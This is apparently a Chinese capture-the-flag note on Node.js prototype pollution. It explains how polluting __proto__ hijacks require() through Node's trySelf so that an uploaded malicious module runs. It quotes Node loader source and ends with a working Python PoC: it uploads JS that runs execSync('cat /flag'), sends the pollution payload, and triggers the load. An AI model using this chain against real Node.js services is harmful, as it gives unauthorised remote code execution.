tags:: CTF/JS/原型链污染

- [参考](https://blog.csdn.net/Leaf_initial/article/details/131529071#t3)
- # 思路
	- 上传恶意js模块，用原型链污染攻击`require("err.js")`，使其加载恶意JS，最终实现RCE
- # 污染require
	- 注意
		- 对应的模块必须还未被加载，否则会调用缓存内的模块而不是加载我们的恶意文件
	- 原理
		- nodejs在进行require时，其最终会使用`loader`文件中的`trySelf`函数获取最终文件路径
		- 而`trySelf`中，文件路径由这一行的变量决定：
			- ```js
			  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
			  ```
		- 在本地没有`package.json`时，前面的`readPackageScope`返回`false`，此时我们可以通过后方的`{}`修改`pkg`和`pkgPath`变量，改变最终输出的文件路径
		- 最终输出的文件路径由后面的`packageExportsResolve`决定，输出的路径为我们传入的`pkgPath`目录中的`pkg`文件
			- 注意这里必须让`pkg`以`./`开头
		- trySelf的实现如下：
			- ```js
			  function trySelf(parentPath, request) {
			    if (!parentPath) return false;
			  
			    const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
			    if (!pkg || pkg.exports === undefined) return false;
			    if (typeof pkg.name !== 'string') return false;
			  
			    let expansion;
			    if (request === pkg.name) { // 需要绕过，让此处为true
			      expansion = '.';
			    } else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
			      expansion = '.' + StringPrototypeSlice(request, pkg.name.length);
			    } else {
			      return false;
			    }
			  
			    try {
			      return finalizeEsmResolution(packageExportsResolve(
			        pathToFileURL(pkgPath + '/package.json'), expansion, pkg,
			        pathToFileURL(parentPath), cjsConditions), parentPath, pkgPath);
			    } catch (e) {
			      if (e.code === 'ERR_MODULE_NOT_FOUND')
			        throw createEsmNotFoundErr(request, pkgPath + '/package.json');
			      throw e;
			    }
			  }
			  ```
	- 最终的payload如下：
		- ```python
		  payload = {
		      "__proto__": {
		          "data": {
		            "name": "./err.js", # 必须和require的参数相同
		            "exports": "./" + name # 我们的目标文件，必须以./开头
		          },
		          "path": "/app/upload", # 目标文件所在的路径
		      }
		  }
		  ```
- # PoC
	- ```python
	  payload = """
	  obj={
	      getRandomErr:() => {
	          return require("child_process").execSync("cat /flag").toString();
	      }
	  }
	  console.log("恶意文件来了啵")
	  
	  module.exports = obj
	  """
	  
	  r = base_post(url + "/upload", files={"file": ("a.js", payload)})
	  print(r.text)
	  name = r.json()["url"].rpartition("/")[2]
	  print(name)
	  
	  payload = {
	      "__proto__": {
	          "data": {"name": "./err.js", "exports": "./{}".format(name)},
	          "path": "/app/upload",
	      }
	  }
	  
	  r = base_post(url + "/pollution", json=payload)
	  
	  print(r.text)
	  
	  r = base_post(url + "/upload")
	  print(r.text)
	  ```